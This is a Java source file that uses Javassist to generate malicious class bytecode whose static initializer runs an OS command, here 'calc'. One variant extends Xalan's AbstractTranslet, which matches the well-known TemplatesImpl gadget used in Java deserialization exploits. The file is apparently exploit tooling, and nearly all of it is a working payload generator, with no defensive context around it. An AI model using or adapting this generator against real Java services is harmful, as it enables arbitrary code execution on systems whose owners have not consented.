package com.yyjccc.javassist;

import javassist.*;

import java.io.IOException;

public class Calc {


	public static byte[] getCodeByte()  {
		try {
			return generate().toBytecode();
		} catch (IOException | CannotCompileException  e) {
			throw new RuntimeException(e);
		}
	}


	public static byte[] getCodeByteTemplate(){
		try {
			return generateTemplateCode().toBytecode();
		} catch (IOException | CannotCompileException | NotFoundException e) {
			throw new RuntimeException(e);
		}
	}



	private static CtClass generateTemplateCode() throws NotFoundException, CannotCompileException {
		ClassPool pool=ClassPool.getDefault();
		CtClass ctClass = pool.makeClass("Yyjccc");
		CtClass superClass=pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
		ctClass.setSuperclass(superClass);
		CtConstructor ctConstructor = ctClass.makeClassInitializer();
		ctConstructor.setBody("Runtime.getRuntime().exec(\"calc\");");
		return ctClass;
	}

	private static CtClass generate() throws CannotCompileException {
		ClassPool pool=ClassPool.getDefault();
		CtClass ctClass = pool.makeClass("Yyjccc");

		CtConstructor ctConstructor = ctClass.makeClassInitializer();
		ctConstructor.setBody("Runtime.getRuntime().exec(\"calc\");");
		return ctClass;
	}

}
